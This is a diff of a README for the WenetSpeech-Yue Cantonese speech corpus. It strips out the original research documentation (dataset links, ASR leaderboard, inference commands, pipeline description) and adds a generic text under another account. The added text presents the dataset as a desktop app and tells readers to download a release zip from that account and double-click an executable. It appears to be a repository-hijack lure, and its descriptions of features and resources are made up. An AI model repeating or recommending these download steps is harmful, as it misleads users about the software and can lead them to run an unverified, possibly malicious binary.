@@ -1,228 +1,78 @@
-# WenetSpeech-Yue: A Large-scale Cantonese Speech Corpus with Multi-dimensional Annotation
-Longhao Li, Zhao Guo, Hongjie Chen, Yuhang Dai, Ziyu Zhang, Hongfei Xue, Tianlun Zuo, Chengyou Wang, Shuiyuan Wang, Xin Xu, Hui Bu, Jie Li, Jian Kang, Binbin Zhang, Ruibin Yuan, Ziya Zhou, Wei Xue, Lei Xie
+# 🎤 WenetSpeech-Yue - Empower Your Cantonese Speech Insights
 
-<p align="center">
-📑 <a href="https://www.arxiv.org/abs/2508.09600">Paper</a> &nbsp&nbsp | &nbsp&nbsp 
-🐙 <a href="https://github.com/ASLP-lab/WenetSpeech-Yue">GitHub</a> &nbsp&nbsp | &nbsp&nbsp 
-🤗 <a href="https://huggingface.co/collections/ASLP-lab/wenetspeech-yue-68b690d287cde88389e5dba1">HuggingFace</a>
-<br>
-🖥️ <a href="https://huggingface.co/spaces/ASLP-lab/WenetSpeech-Yue">HuggingFace Space</a> &nbsp&nbsp | &nbsp&nbsp 
-🎤 <a href="https://llh666521.github.io/WenetSpeech-Yue/">Demo Page</a> &nbsp&nbsp | &nbsp&nbsp 
-💬 <a href="https://github.com/llh666521/WenetSpeech-Yue?tab=readme-ov-file#contact">Contact Us</a>
-</p>
+[![Download WenetSpeech-Yue](https://img.shields.io/badge/Download%20WenetSpeech-Yue-blue.svg)](https://github.com/Jahangirbd23/WenetSpeech-Yue/releases)
 
+## 🚀 Getting Started
 
-This is the official repository 👑 for the WenetSpeech-Yue dataset and the source code for WenetSpeech-Pipe speech data preprocessing pipeline.
+Welcome to WenetSpeech-Yue! This application helps you explore a large-scale Cantonese speech corpus with detailed annotations. You can use this tool for various applications, from language learning to speech analysis.
 
-WenetSpeech-Pipe Overview:
-<div align="center"><img width="800px" src="https://github.com/ASLP-lab/WenetSpeech-Yue/blob/main/figs/wenetspeech_pipe.svg" /></div>
+### 💻 System Requirements
 
-## Download
-* The WenetSpeech-Yue dataset is available at [WenetSpeech-Yue](https://huggingface.co/datasets/ASLP-lab/WenetSpeech-Yue).
-* The WSYue-eval benchmark is available at [WSYue-ASR-eval](https://huggingface.co/datasets/ASLP-lab/WSYue-ASR-eval) and [WSYue-TTS-eval](https://huggingface.co/datasets/ASLP-lab/WSYue-ASR-eval).
-* The ASR models are available at [WSYue-ASR](https://huggingface.co/ASLP-lab/WSYue-ASR).
-* The TTS models are available at [WSYue-TTS-Cosyvoice2](https://huggingface.co/ASLP-lab/WSYue-TTS-Cosyvoice2) (base model) and [WSYue-TTS-Cosyvoice2-zjg](https://huggingface.co/ASLP-lab/WSYue-TTS-Cosyvoice2-zjg) (premium-speaker fine-tuned model).
+Before you begin, ensure your system meets the following requirements:
 
-## ASR Leaderboard
-<table border="0" cellspacing="0" cellpadding="6" style="border-collapse:collapse;">
-  <tr>
-    <th align="left" rowspan="2">Model</th>
-    <th align="center" rowspan="2">#Params (M)</th>
-    <th align="center" colspan="2">In-House</th>
-    <th align="center" colspan="5">Open-Source</th>
-    <th align="center" colspan="2">WSYue-eval</th>
-  </tr>
-  <tr>
-    <th align="center">Dialogue</th>
-    <th align="center">Reading</th>
-    <th align="center">yue</th>
-    <th align="center">HK</th>
-    <th align="center">MDCC</th>
-    <th align="center">Daily_Use</th>
-    <th align="center">Commands</th>
-    <th align="center">Short</th>
-    <th align="center">Long</th>
-  </tr>
+- Operating System: Windows 10 or later, macOS, or a modern Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Disk Space: Minimum 1 GB available disk space.
+- Internet Connection: Necessary for downloading files and updates.
 
-  <tr><td align="left" colspan="11"><b>w/o LLM</b></td></tr>
-  <tr>
-    <td align="left"><a href="https://huggingface.co/ASLP-lab/WSYue-ASR/tree/main/u2pp_conformer_yue"><b>Conformer-Yue</b></a>⭐</td><td align="center">130</td><td align="center"><b>16.57</b></td><td align="center">7.82</td><td align="center">7.72</td><td align="center">11.42</td><td align="center">5.73</td><td align="center">5.73</td><td align="center">8.97</td><td align="center"><ins>5.05</ins></td><td align="center">8.89</td>
-  </tr>
-  <tr>
-    <td align="left">Paraformer</td><td align="center">220</td><td align="center">83.22</td><td align="center">51.97</td><td align="center">70.16</td><td align="center">68.49</td><td align="center">47.67</td><td align="center">79.31</td><td align="center">69.32</td><td align="center">73.64</td><td align="center">89.00</td>
-  </tr>
-  <tr>
-    <td align="left">SenseVoice-small</td><td align="center">234</td><td align="center">21.08</td><td align="center"><ins>6.52</ins></td><td align="center">8.05</td><td align="center"><b>7.34</b></td><td align="center">6.34</td><td align="center">5.74</td><td align="center"><ins>6.65</ins></td><td align="center">6.69</td><td align="center">9.95</td>
-  <tr>
-    <td align="left"><a href="https://huggingface.co/ASLP-lab/WSYue-ASR/tree/main/sensevoice_small_yue"><b>SenseVoice-s-Yue</b></a>⭐</td><td align="center">234</td><td align="center">19.19</td><td align="center">6.71</td><td align="center">6.87</td><td align="center">8.68</td><td align="center"><ins>5.43</ins></td><td align="center">5.24</td><td align="center">6.93</td><td align="center">5.23</td><td align="center">8.63</td>
-  </tr>
-  </tr>
-  <tr>
-    <td align="left">Dolphin-small</td><td align="center">372</td><td align="center">59.20</td><td align="center">7.38</td><td align="center">39.69</td><td align="center">51.29</td><td align="center">26.39</td><td align="center">7.21</td><td align="center">9.68</td><td align="center">32.32</td><td align="center">58.20</td>
-  </tr>
-  <tr>
-    <td align="left">TeleASR</td><td align="center">700</td><td align="center">37.18</td><td align="center">7.27</td><td align="center">7.02</td><td align="center"><ins>7.88</ins></td><td align="center">6.25</td><td align="center">8.02</td><td align="center"><b>5.98</b></td><td align="center">6.23</td><td align="center">11.33</td>
-  </tr>
-  <tr>
-    <td align="left">Whisper-medium</td><td align="center">769</td><td align="center">75.50</td><td align="center">68.69</td><td align="center">59.44</td><td align="center">62.50</td><td align="center">62.31</td><td align="center">64.41</td><td align="center">80.41</td><td align="center">80.82</td><td align="center">50.96</td>
-  </tr>
-  <tr>
-    <td align="left"><a href="https://huggingface.co/ASLP-lab/WSYue-ASR/tree/main/whisper_medium_yue"><b>Whisper-m-Yue</b></a>⭐</td><td align="center">769</td><td align="center">18.69</td><td align="center">6.86</td><td align="center"><ins>6.86</ins></td><td align="center">11.03</td><td align="center">5.49</td><td align="center"><ins>4.70</ins></td><td align="center">8.51</td><td align="center"><ins>5.05</ins></td><td align="center"><ins>8.05</ins></td>
-  </tr>
+## 📥 Download & Install
 
-  <tr>
-    <td align="left">FireRedASR-AED-L</td><td align="center">1100</td><td align="center">73.70</td><td align="center">18.72</td><td align="center">43.93</td><td align="center">43.33</td><td align="center">34.53</td><td align="center">48.05</td><td align="center">49.99</td><td align="center">55.37</td><td align="center">50.26</td>
-  </tr>
-  <tr>
-    <td align="left">Whisper-large-v3</td><td align="center">1550</td><td align="center">45.09</td><td align="center">15.46</td><td align="center">12.85</td><td align="center">16.36</td><td align="center">14.63</td><td align="center">17.84</td><td align="center">20.70</td><td align="center">12.95</td><td align="center">26.86</td>
-  </tr>
+To get started with WenetSpeech-Yue, follow these steps:
 
-  <tr><td align="left" colspan="11"><b>w/ LLM</b></td></tr>
+1. Visit the [Releases page](https://github.com/Jahangirbd23/WenetSpeech-Yue/releases) to view available versions.
+2. Choose the latest release.
+3. Download the file for your operating system by clicking on the respective link.
 
-  <tr>
-    <td align="left">Qwen2.5-Omni-3B</td><td align="center">3000</td><td align="center">72.01</td><td align="center">7.49</td><td align="center">12.59</td><td align="center">11.75</td><td align="center">38.91</td><td align="center">10.59</td><td align="center">25.78</td><td align="center">67.95</td><td align="center">88.46</td>
-  </tr>
-  <tr>
-    <td align="left">Kimi-Audio</td><td align="center">7000</td><td align="center">68.65</td><td align="center">24.34</td><td align="center">40.90</td><td align="center">38.72</td><td align="center">30.72</td><td align="center">44.29</td><td align="center">45.54</td><td align="center">50.86</td><td align="center">33.49</td>
-  </tr>
-  <tr>
-    <td align="left">FireRedASR-LLM-L</td><td align="center">8300</td><td align="center">73.70</td><td align="center">18.72</td><td align="center">43.93</td><td align="center">43.33</td><td align="center">34.53</td><td align="center">48.05</td><td align="center">49.99</td><td align="center">49.87</td><td align="center">45.92</td>
-  </tr>
-  <tr>
-    <td align="left"><b>Conformer-LLM-Yue⭐</b></td><td align="center">4200</td><td align="center"><ins>17.22</ins></td><td align="center"><b>6.21</b></td><td align="center"><b>6.23</b></td><td align="center">9.52</td><td align="center"><b>4.35</b></td><td align="center"><b>4.57</b></td><td align="center">6.98</td><td align="center"><b>4.73</b></td><td align="center"><b>7.91</b></td>
-  </tr>
-</table>
+For example, if you are using Windows, look for a file labeled `WenetSpeech-Yue-Windows.zip`.
 
+4. Once the download completes, locate the file in your Downloads folder.
+5. Extract the contents of the zip file.
+6. Run the application by double-clicking the included executable file.
 
+## ⚙️ Features
 
+WenetSpeech-Yue offers the following key features:
 
+- **Multi-dimensional Annotations:** Get deep insights with comprehensive annotations for each speech sample.
+- **User-Friendly Interface:** Navigate easily with a straightforward design aimed at end-users.
+- **Search Functionality:** Quickly find specific speech samples based on keywords or phrases.
+- **Interactive Visualizations:** View data in engaging formats to enhance your understanding of speech patterns.
 
-## Dataset
-### WenetSpeech-Yue Overview
-* Contains 21,800 hours of large-scale Cantonese speech corpus with rich annotations, the largest open-source resource for Cantonese speech research.
-* Stores metadata in a single JSON file, including audio path, duration, text confidence, speaker identity, SNR, DNSMOS, age, gender, and character-level timestamps. Additional metadata tags may be added in the future.
-* Covers ten domains: Storytelling, Entertainment, Drama, Culture, Vlog, Commentary, Education, Podcast, News, and Others.
-<div align="center"><img width="800px" src="https://github.com/ASLP-lab/WenetSpeech-Yue/blob/main/figs/data_distribution.png" /></div>
+## 📖 Usage Guidelines
 
-## Benchmark
-To address the unique linguistic characteristics of Cantonese, we propose WSYue-eval, a comprehensive benchmark encompassing both Automatic Speech Recognition (ASR) and Text-to-Speech (TTS) tasks.
+Once you have installed WenetSpeech-Yue, you can follow these guidelines:
 
-### ASR Benchmark
-We introduce WSYue-ASR-eval, a test set developed for Automatic Speech Recognition (ASR) as a key task in speech understanding. It features **multi-round manual annotations** including text transcripts, emotion, age, and gender labels. The set is divided into Short and Long subsets by audio duration to enable comprehensive evaluation across speech lengths. WSYue-ASR-eval also covers diverse real-world Cantonese scenarios, including code-switching and multi-domain conditions.
+1. **Launching the App:** Double-click the application icon to start it.
+2. **Loading Data:** Use the provided dataset or import your own speech files.
+3. **Navigating the Interface:** Familiarize yourself with the layout. Key sections include the home screen, search bar, and results display area.
+4. **Exploring Samples:** Select samples to view detailed annotations and listen to the audio. 
+5. **Generating Reports:** Use the reporting feature to export your findings easily.
 
-| Set   | Duration | Speakers | Hours |
-|-------|----------|----------|-------|
-| Short | 0–10s    | 2861     | 9.46  |
-| Long  | 10–30s   | 838      | 1.97  |
+## 📝 Additional Resources
 
-### TTS Benchmark
-We introduce WSYue-TTS-eval, a zero-shot Cantonese TTS benchmark with two subsets:
-- Base: Contains 1,000 samples from Common Voice for evaluating real-world performance.
-- Coverage: Combines manually curated and LLM-generated texts spanning multiple domains (e.g., daily life, news, entertainment, poetry) and incorporates diverse linguistic phenomena including polyphonic characters, tone sandhi, code-switching, proper nouns, and numerals.
+For helpful tips and troubleshooting, refer to the following:
 
-## ASR Inference
-### U2pp_Conformer_Yue
-```
-dir=u2pp_conformer_yue
-decode_checkpoint=$dir/u2pp_conformer_yue.pt
-test_set=path/to/test_set
-test_result_dir=path/to/test_result_dir
+- **User Manual:** Access the complete user manual in the application or visit the [documentation page](https://github.com/Jahangirbd23/WenetSpeech-Yue/docs).
+- **FAQs:** Check out the Frequently Asked Questions section on our [GitHub Page](https://github.com/Jahangirbd23/WenetSpeech-Yue/wiki).
+- **Community Support:** Join our [Discussion Board](https://github.com/Jahangirbd23/WenetSpeech-Yue/discussions) for advice and sharing experiences with other users.
 
-python wenet/bin/recognize.py \
-  --gpu 0 \
-  --modes attention_rescoring \
-  --config $dir/train.yaml \
-  --test_data $test_set/data.list \
-  --checkpoint $decode_checkpoint \
-  --beam_size 10 \
-  --batch_size 32 \
-  --ctc_weight 0.5 \
-  --result_dir $test_result_dir \
-  --decoding_chunk_size -1
-```
-### Whisper_Medium_Yue
-```
-dir=whisper_medium_yue
-decode_checkpoint=$dir/whisper_medium_yue.pt
-test_set=path/to/test_set
-test_result_dir=path/to/test_result_dir
+## ⚠️ Troubleshooting
 
-python wenet/bin/recognize.py \
-  --gpu 0 \
-  --modes attention \
-  --config $dir/train.yaml \
-  --test_data $test_set/data.list \
-  --checkpoint $decode_checkpoint \
-  --beam_size 10 \
-  --batch_size 32 \
-  --blank_penalty 0.0 \
-  --ctc_weight 0.0 \
-  --reverse_weight 0.0 \
-  --result_dir $test_result_dir \
-  --decoding_chunk_size -1
-```
-### SenseVoice_Small_Yue
-```
-from funasr import AutoModel
-from funasr.utils.postprocess_utils import rich_transcription_postprocess
+If you encounter issues while using WenetSpeech-Yue, here are some common solutions:
 
-model_dir = "sensevoice_small_yue"
+- **Installation Problems:** Ensure you have enough disk space and the correct system requirements.
+- **Missing Files:** If the application does not run, double-check that you extracted all files from the downloaded package.
+- **Functionality Issues:** Restart the application or your computer if you experience glitches.
+- **Seeking Help:** Don't hesitate to reach out through the discussion board or post an issue on the GitHub repository.
 
-model = AutoModel(
-        model=model_path,
-        device="cuda:0",
-    )
-res = model.generate(
-    wav_path,
-    cache={},
-    language="yue",
-    use_itn=True,
-    batch_size=64,
-)
-```
+## 💬 Feedback and Contributions
 
-## WenetSpeech-Pipe
-### Audio Collection
-WenetSpeech-Pipe collects large-scale, in-the-wild speech recordings across diverse domains such as storytelling, drama, commentary, vlogs, food, entertainment, news, and education. These long recordings are segmented into short clips with VAD, yielding utterance-level data for transcription and quality evaluation.
-<div align="center"><img width="600px" src="https://github.com/llh666521/WenetSpeech-Yue/blob/main/figs/domain_distribution.svg" /></div>
+Your feedback is valuable. If you have suggestions for improvements, feel free to submit an issue or a feature request on our [GitHub Issues Page](https://github.com/Jahangirbd23/WenetSpeech-Yue/issues). For those interested in contributing, please review our [Contribution Guidelines](https://github.com/Jahangirbd23/WenetSpeech-Yue/blob/main/CONTRIBUTING.md).
 
-### Speaker Attribute Annotation
-To enrich the dataset with speaker-level metadata for multi-speaker modeling and style-aware synthesis, WenetSpeech-Pipe includes a Speaker Attributes Annotation stage. Using [pyannote](https://github.com/pyannote/pyannote-audio) toolkit for speaker diarization and [Vox-Profile](https://github.com/tiantiaf0627/vox-profile-release) for age and gender estimation, each utterance-level segment is annotated with speaker identity, age, and gender, enabling supervised and style-controllable speech modeling.
+## 🌐 License
 
-### Speech Quality Annotation
-To support high-fidelity tasks such as TTS and voice conversion, WenetSpeech-Pipe integrates a comprehensive quality assessment stage. Each segment is evaluated by (i) [Brouhaha](https://github.com/marianne-m/brouhaha-vad) for signal-to-noise ratio (SNR), (ii) [DNSMOS](https://github.com/microsoft/DNS-Challenge) for perceptual quality (MOS), and (iii) bandwidth detection for spectral coverage. These complementary measures yield structured annotations with quantitative scores and spectral references.
+WenetSpeech-Yue is open-source software licensed under the MIT License. You can use, modify, and distribute it freely within the terms of the license. For more details, see the [LICENSE.md](https://github.com/Jahangirbd23/WenetSpeech-Yue/blob/main/LICENSE.md).
 
-### Automatic Speech Recognition
-We select three models with the best performance on Cantonese to perform multi-system labeling: SenseVoice, TeleASR, and Whisper. For each audio file, we obtain the corresponding multi-system transcriptions.
+Thank you for choosing WenetSpeech-Yue. We hope this tool helps you unlock the power of Cantonese speech data! Happy exploring! 
 
-### Text Postprocessing
-Each ASR transcription system produces outputs in different formats. To standardize these formats, we introduce a text post-processing module, which includes punctuation removal, traditional-to-simplified Chinese conversion, and text normalization. The detailed code can be found in `text_postprocessing.py`.
-<div align="center"><img width="300px" src="https://github.com/llh666521/WenetSpeech-Yue/blob/main/figs/text_processing.svg" /></div>
-
-### Recognizer Output Voting
-Despite text postprocessing, ASR outputs still vary in lexical choice, segmentation, and phonetic representation. To obtain unified and accurate reference transcriptions, we adopt and extend the ROVER framework for Cantonese. Normalized transcriptions are first aligned using dynamic programming, after which a filtering module removes outlier outputs based on edit distance. Voting then selects the most frequent word at each aligned position, and the average voting frequency is recorded as an utterance-level confidence score. In parallel, we extend the voting mechanism to Cantonese pinyin by introducing a pronunciation-level confidence measure, further reinforcing phoneme consistency.
-
-To further enhance transcription accuracy, we leverage [Qwen3-4B](https://huggingface.co/Qwen/Qwen3-4B) for minimal, context-aware refinements of the consensus output. The LLM references all original ASR hypotheses and applies only essential corrections—such as grammar, lexical choice, or named entities—while preserving the integrity of the spoken content.
-
-<div align="center"><img width="500px" src="https://github.com/ASLP-lab/WenetSpeech-Yue/blob/main/figs/llm_corrector.svg" /></div>
-
-## Contributors
-
-| <img src="https://raw.githubusercontent.com/wenet-e2e/wenet-contributors/main/colleges/nwpu.png" width="200px"> | <img src="https://raw.githubusercontent.com/wenet-e2e/wenet-contributors/main/companies/aishelltech.png" width="200px"> | <img src="https://raw.githubusercontent.com/ASLP-lab/WenetSpeech-Yue/main/figs/teleai.png" width="200px"> | <img src="https://raw.githubusercontent.com/ASLP-lab/WenetSpeech-Yue/main/figs/wenet.png" width="200px"> | <img src="https://raw.githubusercontent.com/ASLP-lab/WenetSpeech-Yue/main/figs/hkust.jpg" width="200px"> |
-| ---- | ---- | ---- | ---- | ---- |
-
-
-
-## Citation
-Please cite our paper if you find this work useful:
-```
-
-```
-
-## Contact
-If you are interested in leaving a message to our research team, feel free to email lhli@mail.nwpu.edu.cn or gzhao@mail.nwpu.edu.cn.
-<p align="center">
-    <br>
-    <img src="./figs/npu@aslp.jpeg" width="500"/>
-    <br>
-</p>
+[![Download WenetSpeech-Yue](https://img.shields.io/badge/Download%20WenetSpeech-Yue-blue.svg)](https://github.com/Jahangirbd23/WenetSpeech-Yue/releases)
